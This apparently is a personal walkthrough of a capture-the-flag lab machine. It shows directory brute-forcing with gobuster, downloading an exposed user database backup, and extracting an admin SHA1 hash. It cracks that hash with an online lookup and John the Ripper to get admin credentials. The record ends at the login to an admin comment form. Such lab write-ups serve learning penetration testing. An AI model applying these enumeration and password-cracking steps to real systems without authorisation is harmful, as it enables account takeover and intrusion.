http://10.10.32.158

![[main web.png]]

```
gobuster dir -u http://10.10.32.158:80 -w /usr/share/wordlists/dirb/big.txt -o /opt/THM/Mustacchio/2-enum/web/gob_dir_big.md
```

```
/custom               (Status: 301) [Size: 313] [--> http://10.10.32.158/custom/]
```

![[custom dir.png]]

http://10.10.32.158/custom/js/

![[users.bak web.png]]

```
wget http://10.10.32.158/custom/js/users.bak
```

```
strings users.bak    
```


```                     
SQLite format 3
tableusersusers
CREATE TABLE users(username text NOT NULL, password text NOT NULL)
]admin1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
```

```
admin
1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
```

https://hashes.com/en/tools/hash_identifier

```
1868e36a6d2b17d4c2745f1659433a54d4bc5f4b - Possible algorithms: SHA1
```

luckliy it has already been identified

https://hashes.com/en/decrypt/hash

```
1868e36a6d2b17d4c2745f1659433a54d4bc5f4b:bulldog19
```

but for the sake of the process

```
john --wordlist=/usr/share/wordlists/rockyou.txt sqlhashes.md 
```

```
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-AxCrypt"
Use the "--format=Raw-SHA1-AxCrypt" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-Linkedin"
Use the "--format=Raw-SHA1-Linkedin" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "ripemd-160"
Use the "--format=ripemd-160" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "has-160"
Use the "--format=has-160" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 512/512 AVX512BW 16x])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
bulldog19        (?)     
1g 0:00:00:00 DONE (2024-11-22 04:35) 25.00g/s 17102Kp/s 17102Kc/s 17102KC/s bulldog93..bullcrap1
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed.
```

```
admin
bulldog19
```

checking out that port found earlier

http://10.10.32.158:8765

![[admin panel web.png]]


we are redirected to a post form

http://10.10.32.158:8765/home.php

![[admin comment web.png]]
